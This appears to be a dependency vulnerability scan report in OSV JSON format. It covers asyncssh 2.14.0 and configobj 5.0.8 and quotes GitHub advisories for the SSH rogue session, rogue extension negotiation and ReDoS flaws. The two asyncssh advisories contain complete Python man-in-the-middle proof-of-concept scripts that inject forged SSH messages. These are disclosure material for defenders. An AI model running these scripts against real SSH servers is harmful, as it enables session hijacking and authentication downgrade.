[
  {
    "package": {
      "name": "asyncssh",
      "version": "2.14.0",
      "ecosystem": "PyPI",
      "commit": ""
    },
    "vulnerabilities": [
      {
        "modified": "2023-11-09T18:49:39Z",
        "published": "2023-11-09T18:35:14Z",
        "schema_version": "1.6.0",
        "id": "GHSA-c35q-ffpf-5qpm",
        "aliases": [
          "CVE-2023-46446"
        ],
        "summary": "AsyncSSH Rogue Session Attack",
        "details": "### Summary\n\nAn issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.\n\n### Details\n\nThe rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.\n\nThe attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.\n\n### PoC\n\n<details>\n  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>\n\n  ```python\n  #!/usr/bin/python3\n  import socket\n  from threading import Thread\n  from binascii import unhexlify\n  from time import sleep\n  \n  ##################################################################################\n  ## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##\n  ##                                                                              ##\n  ## Variant: Unmodified variant (EXT_INFO by client required)                    ##\n  ##                                                                              ##\n  ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##\n  ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##\n  ##                                                                              ##\n  ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##\n  ##################################################################################\n  \n  # IP and port for the TCP proxy to bind to\n  PROXY_IP = '127.0.0.1'\n  PROXY_PORT = 2222\n  \n  # IP and port of the server\n  SERVER_IP = '127.0.0.1'\n  SERVER_PORT = 22\n  \n  # Length of the individual messages\n  NEW_KEYS_LENGTH = 16\n  CLIENT_EXT_INFO_LENGTH = 60\n  # Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)\n  ADDITIONAL_CLIENT_DATA_LENGTH = 60\n  \n  newkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\n  def contains_newkeys(data):\n      return newkeys_payload in data\n  \n  rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')\n  def insert_rogue_authentication_request(data):\n      newkeys_index = data.index(newkeys_payload)\n      # Insert rogue authentication request and remove SSH_MSG_EXT_INFO\n      return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]\n  \n  def forward_client_to_server(client_socket, server_socket):\n      delay_next = False\n      try:\n          while True:\n              client_data = client_socket.recv(4096)\n              if delay_next:\n                  delay_next = False\n                  sleep(0.25)\n              if contains_newkeys(client_data):\n                  print(\"[+] SSH_MSG_NEWKEYS sent by client identified!\")\n                  if len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:\n                      print(\"[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!\")\n                  while len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:\n                      client_data += client_socket.recv(4096)\n                  print(f\"[d] Original client_data before modification: {client_data.hex()}\")\n                  client_data = insert_rogue_authentication_request(client_data)\n                  print(f\"[d] Modified client_data with rogue authentication request: {client_data.hex()}\")\n                  delay_next = True\n              if len(client_data) == 0:\n                  break\n              server_socket.send(client_data)\n      except ConnectionResetError:\n          print(\"[!] Client connection has been reset. Continue closing sockets.\")\n      print(\"[!] forward_client_to_server thread ran out of data, closing sockets!\")\n      client_socket.close()\n      server_socket.close()\n  \n  def forward_server_to_client(client_socket, server_socket):\n      try:\n          while True:\n              server_data = server_socket.recv(4096)\n              if len(server_data) == 0:\n                  break\n              client_socket.send(server_data)\n      except ConnectionResetError:\n          print(\"[!] Target connection has been reset. Continue closing sockets.\")\n      print(\"[!] forward_server_to_client thread ran out of data, closing sockets!\")\n      client_socket.close()\n      server_socket.close()\n  \n  if __name__ == '__main__':\n      print(\"--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---\")\n      mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      mitm_socket.bind((PROXY_IP, PROXY_PORT))\n      mitm_socket.listen(5)\n  \n      print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n  \n      try:\n          while True:\n              client_socket, client_addr = mitm_socket.accept()\n              print(f\"[+] Accepted connection from: {client_addr}\")\n              print(f\"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.\")\n              server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n              server_socket.connect((SERVER_IP, SERVER_PORT))\n              print(\"[+] Spawning new forwarding threads to handle client connection.\")\n              Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()\n              Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()\n      except KeyboardInterrupt:\n          client_socket.close()\n          server_socket.close()\n          mitm_socket.close()\n  ```\n</details>\n\n### Impact\n\nThe impact heavily depends on the application logic implemented by the AsyncSSH server. In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.\n",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asyncssh",
              "purl": "pkg:pypi/asyncssh"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "2.14.1"
                  }
                ]
              }
            ],
            "versions": [
              "0.8.1",
              "0.8.2",
              "0.8.3",
              "0.8.4",
              "0.9.0",
              "0.9.1",
              "0.9.2",
              "1.0.0",
              "1.0.1",
              "1.1.0",
              "1.1.1",
              "1.10.0",
              "1.10.1",
              "1.11.0",
              "1.11.1",
              "1.12.0",
              "1.12.1",
              "1.12.2",
              "1.13.0",
              "1.13.1",
              "1.13.2",
              "1.13.3",
              "1.14.0",
              "1.15.0",
              "1.15.1",
              "1.16.0",
              "1.16.1",
              "1.17.0",
              "1.17.1",
              "1.18.0",
              "1.2.0",
              "1.2.1",
              "1.3.0",
              "1.3.1",
              "1.3.2",
              "1.4.0",
              "1.4.1",
              "1.5.0",
              "1.5.1",
              "1.5.2",
              "1.5.3",
              "1.5.4",
              "1.5.5",
              "1.5.6",
              "1.6.0",
              "1.6.1",
              "1.6.2",
              "1.7.1",
              "1.7.2",
              "1.7.3",
              "1.8.0",
              "1.8.1",
              "1.9.0",
              "2.0.0",
              "2.0.1",
              "2.1.0",
              "2.10.0",
              "2.10.1",
              "2.11.0",
              "2.12.0",
              "2.13.0",
              "2.13.1",
              "2.13.2",
              "2.14.0",
              "2.2.0",
              "2.2.1",
              "2.3.0",
              "2.4.0",
              "2.4.1",
              "2.4.2",
              "2.5.0",
              "2.6.0",
              "2.7.0",
              "2.7.1",
              "2.7.2",
              "2.8.0",
              "2.8.1",
              "2.9.0"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-c35q-ffpf-5qpm/GHSA-c35q-ffpf-5qpm.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm"
          },
          {
            "type": "WEB",
            "url": "https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/ronf/asyncssh"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-345",
            "CWE-349",
            "CWE-354",
            "CWE-359"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2023-11-09T18:35:14Z",
          "nvd_published_at": null,
          "severity": "HIGH"
        }
      },
      {
        "modified": "2023-11-09T18:49:20Z",
        "published": "2023-11-09T18:34:53Z",
        "schema_version": "1.6.0",
        "id": "GHSA-cfc2-wr2v-gxm5",
        "aliases": [
          "CVE-2023-46445"
        ],
        "summary": "AsyncSSH Rogue Extension Negotiation",
        "details": "### Summary\n\nAn issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.\n\n### Details\n\nThe rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.\n\nA correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).\n\n### PoC\n\n<details>\n    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>\n\n   ```python\n    #!/usr/bin/python3\n    import socket\n    from threading import Thread\n    from binascii import unhexlify\n    \n    #####################################################################################\n    ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##\n    ##                                                                                 ##\n    ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##\n    ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##\n    ##                                                                                 ##\n    ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##\n    #####################################################################################\n    \n    # IP and port for the TCP proxy to bind to\n    PROXY_IP = '127.0.0.1'\n    PROXY_PORT = 2222\n    \n    # IP and port of the server\n    SERVER_IP = '127.0.0.1'\n    SERVER_PORT = 22\n    \n    # Length of the individual messages\n    NEW_KEYS_LENGTH = 16\n    SERVER_EXT_INFO_LENGTH = 676\n    \n    newkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\n    def contains_newkeys(data):\n        return newkeys_payload in data\n    \n    # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs\n    rogue_ext_info = unhexlify('0000000C060700000000000000000000')\n    def insert_rogue_ext_info(data):\n        newkeys_index = data.index(newkeys_payload)\n        # Insert rogue extension info and remove SSH_MSG_EXT_INFO\n        return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]\n    \n    def forward_client_to_server(client_socket, server_socket):\n        try:\n            while True:\n                client_data = client_socket.recv(4096)\n                if len(client_data) == 0:\n                    break\n                server_socket.send(client_data)\n        except ConnectionResetError:\n            print(\"[!] Client connection has been reset. Continue closing sockets.\")\n        print(\"[!] forward_client_to_server thread ran out of data, closing sockets!\")\n        client_socket.close()\n        server_socket.close()\n    \n    def forward_server_to_client(client_socket, server_socket):\n        try:\n            while True:\n                server_data = server_socket.recv(4096)\n                if contains_newkeys(server_data):\n                    print(\"[+] SSH_MSG_NEWKEYS sent by server identified!\")\n                    if len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:\n                        print(\"[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!\")\n                    while len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:\n                        server_data += server_socket.recv(4096)\n                    print(f\"[d] Original server_data before modification: {server_data.hex()}\")\n                    server_data = insert_rogue_ext_info(server_data)\n                    print(f\"[d] Modified server_data with rogue extension info: {server_data.hex()}\")\n                if len(server_data) == 0:\n                    break\n                client_socket.send(server_data)\n        except ConnectionResetError:\n            print(\"[!] Target connection has been reset. Continue closing sockets.\")\n        print(\"[!] forward_server_to_client thread ran out of data, closing sockets!\")\n        client_socket.close()\n        server_socket.close()\n    \n    if __name__ == '__main__':\n        print(\"--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---\")\n        mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        mitm_socket.bind((PROXY_IP, PROXY_PORT))\n        mitm_socket.listen(5)\n    \n        print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n    \n        try:\n            while True:\n                client_socket, client_addr = mitm_socket.accept()\n                print(f\"[+] Accepted connection from: {client_addr}\")\n                print(f\"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.\")\n                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                server_socket.connect((SERVER_IP, SERVER_PORT))\n                print(\"[+] Spawning new forwarding threads to handle client connection.\")\n                Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()\n                Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()\n        except KeyboardInterrupt:\n            client_socket.close()\n            server_socket.close()\n            mitm_socket.close()\n  ```\n</details>\n\n### Impact\n\nAlgorithm downgrade during user authentication.",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asyncssh",
              "purl": "pkg:pypi/asyncssh"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "2.14.1"
                  }
                ]
              }
            ],
            "versions": [
              "0.8.1",
              "0.8.2",
              "0.8.3",
              "0.8.4",
              "0.9.0",
              "0.9.1",
              "0.9.2",
              "1.0.0",
              "1.0.1",
              "1.1.0",
              "1.1.1",
              "1.10.0",
              "1.10.1",
              "1.11.0",
              "1.11.1",
              "1.12.0",
              "1.12.1",
              "1.12.2",
              "1.13.0",
              "1.13.1",
              "1.13.2",
              "1.13.3",
              "1.14.0",
              "1.15.0",
              "1.15.1",
              "1.16.0",
              "1.16.1",
              "1.17.0",
              "1.17.1",
              "1.18.0",
              "1.2.0",
              "1.2.1",
              "1.3.0",
              "1.3.1",
              "1.3.2",
              "1.4.0",
              "1.4.1",
              "1.5.0",
              "1.5.1",
              "1.5.2",
              "1.5.3",
              "1.5.4",
              "1.5.5",
              "1.5.6",
              "1.6.0",
              "1.6.1",
              "1.6.2",
              "1.7.1",
              "1.7.2",
              "1.7.3",
              "1.8.0",
              "1.8.1",
              "1.9.0",
              "2.0.0",
              "2.0.1",
              "2.1.0",
              "2.10.0",
              "2.10.1",
              "2.11.0",
              "2.12.0",
              "2.13.0",
              "2.13.1",
              "2.13.2",
              "2.14.0",
              "2.2.0",
              "2.2.1",
              "2.3.0",
              "2.4.0",
              "2.4.1",
              "2.4.2",
              "2.5.0",
              "2.6.0",
              "2.7.0",
              "2.7.1",
              "2.7.2",
              "2.8.0",
              "2.8.1",
              "2.9.0"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-cfc2-wr2v-gxm5/GHSA-cfc2-wr2v-gxm5.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5"
          },
          {
            "type": "WEB",
            "url": "https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/ronf/asyncssh"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-345",
            "CWE-349",
            "CWE-354"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2023-11-09T18:34:53Z",
          "nvd_published_at": null,
          "severity": "MODERATE"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-c35q-ffpf-5qpm"
        ]
      },
      {
        "ids": [
          "GHSA-cfc2-wr2v-gxm5"
        ]
      }
    ]
  },
  {
    "package": {
      "name": "configobj",
      "version": "5.0.8",
      "ecosystem": "PyPI",
      "commit": ""
    },
    "vulnerabilities": [
      {
        "modified": "2023-11-03T21:48:20Z",
        "published": "2023-04-03T06:30:19Z",
        "schema_version": "1.6.0",
        "id": "GHSA-c33w-24p9-8m24",
        "aliases": [
          "CVE-2023-26112"
        ],
        "summary": "configobj ReDoS exploitable by developer using values in a server-side configuration file",
        "details": "All versions of the package configobj are vulnerable to Regular Expression Denial of Service (ReDoS) via the validate function, using (.+?)\\((.*)\\). **Note:** This is only exploitable in the case of a developer, putting the offending value in a server side configuration file.",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "configobj",
              "purl": "pkg:pypi/configobj"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "last_affected": "5.0.8"
                  }
                ]
              }
            ],
            "versions": [
              "4.4.0",
              "4.5.0",
              "4.5.1",
              "4.5.2",
              "4.5.3",
              "4.6.0",
              "4.7.0",
              "4.7.1",
              "4.7.2",
              "5.0.0",
              "5.0.1",
              "5.0.2",
              "5.0.3",
              "5.0.4",
              "5.0.5",
              "5.0.6",
              "5.0.7",
              "5.0.8"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-c33w-24p9-8m24/GHSA-c33w-24p9-8m24.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "references": [
          {
            "type": "ADVISORY",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26112"
          },
          {
            "type": "WEB",
            "url": "https://github.com/DiffSK/configobj/issues/232"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/DiffSK/configobj"
          },
          {
            "type": "WEB",
            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6BO4RLMYEJODCNUE3DJIIUUFVTPAG6VN/"
          },
          {
            "type": "WEB",
            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NZHY7B33EFY4LESP2NI4APQUPRROTAZK/"
          },
          {
            "type": "WEB",
            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYU4IHVLOTYMFPH7KDOJGKZQR4GKWPFK/"
          },
          {
            "type": "WEB",
            "url": "https://security.snyk.io/vuln/SNYK-PYTHON-CONFIGOBJ-3252494"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-1333"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2023-04-04T21:40:45Z",
          "nvd_published_at": "2023-04-03T05:15:00Z",
          "severity": "LOW"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-c33w-24p9-8m24"
        ]
      }
    ]
  }
]